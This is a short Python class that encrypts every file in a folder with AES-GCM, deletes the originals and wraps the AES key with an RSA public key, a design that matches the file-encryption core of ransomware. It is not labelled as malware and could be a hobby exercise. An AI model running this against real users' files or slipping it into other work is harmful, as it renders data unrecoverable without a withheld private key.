from Crypto.Cipher import AES,PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import os
class encript:
    def __init__(self):
        self.AES_key = get_random_bytes(32)
    
    def encrypt_files(self,folder_path):

        try:
            file_list=os.listdir(folder_path)
            
            for filename in file_list:
                if filename.endswith(".enc") or filename in ["private.pem","publick.pem","encrypted_key.bin"]:
                    continue
                path=os.path.join(folder_path,filename)
                cipher=AES.new(self.AES_key,AES.MODE_GCM)
                with open(path,"rb")as f:
                    data=f.read()
                ciphertext,tag=cipher.encrypt_and_digest(data)
                with open(path+".enc","wb")as f:
                    f.write(cipher.nonce+tag+ciphertext)
                os.remove(path)
            publick_key=RSA.import_key(open("publick.pem").read())
            cipher_rsa=PKCS1_OAEP.new(publick_key)
            encrypted_key=cipher_rsa.encrypt(self.AES_key)
            with open("encrypted_key.bin","wb")as f:
                f.write(encrypted_key)
            print("✅encrypting compeleted")
            return True
        except Exception as e:
            print(f"⛔ Error during:{e}")
            return False
        
            

    